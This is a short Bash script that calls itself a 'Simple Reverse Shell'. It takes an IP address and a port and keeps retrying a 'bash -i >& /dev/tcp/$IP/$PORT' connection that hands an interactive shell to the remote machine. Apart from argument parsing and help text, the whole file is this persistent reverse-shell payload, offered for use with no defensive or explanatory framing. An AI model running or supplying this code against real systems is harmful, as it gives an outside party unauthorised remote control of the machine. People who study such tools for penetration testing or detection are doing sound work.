#!/bin/bash

###############################################################################
########################### Basic helper functions ###########################
###############################################################################

show_usage() {
	echo "usage: $(basename $0) [-h] IP PORT" 
	echo ""
	echo "Simple Reverse Shell script in Bash that tries indefinitely to connect to a remote machine."
}

show_help() {
	show_usage
	echo ""
	echo "positional arguments:"
	echo "  IP          IPv4 address of the remote machine"
	echo "  PORT        Port of the remote machine"
	echo ""
	echo "optional arguments:"
	echo "  -h, --help	show this help message and exit"
}

###############################################################################
#### Main Function: Parses arguments, tries to connect το remote machine ######
###############################################################################

# Number of positional arguments: IP, PORT
parsed_pos_args=0

# Create CLI interface with arguments
while [[ $# -gt 0 ]]; do
	case $1 in
		-h|--help)
			show_help
			exit 0
			;;
		*)
			# Count up parsed positional arguments
			parsed_pos_args=$((parsed_pos_args+1))
			
			case $parsed_pos_args in
				1)
					# 1st positional argument
					IP=$1
					;;
				2)
					# 2nd positional argument
					PORT=$1
					;;
				*)
					# Extra positional arguments
					echo "$(basename $0): error: unrecognized arguments: $1"
					exit 1
					;;
			esac
			shift
			;;
	esac
done

# Check if arguments are supplied
if [[ -z $IP ]]; then
        echo "$(basename $0): error: the following arguments are required: IP PORT"
        exit 1
elif [[ -z $PORT ]]; then
        echo "$(basename $0): error: the following arguments are required: PORT"
        exit 1
fi

# Try to connect or reconnect to remote Machine
while true; do
	echo "Attempting to connect to remote server [$IP] $PORT"
	# Send reverse shell (ignore bash error messages)
	(bash -i >& /dev/tcp/$IP/$PORT 0>&1) >/dev/null 2>&1
	exit_status=$?
	
	if [[ $exit_status -eq 0 ]]; then
		echo "Connected successfully to [$IP] $PORT"
		exit 0
	else
		echo "Connection failed"
		sleep 2
	fi
done
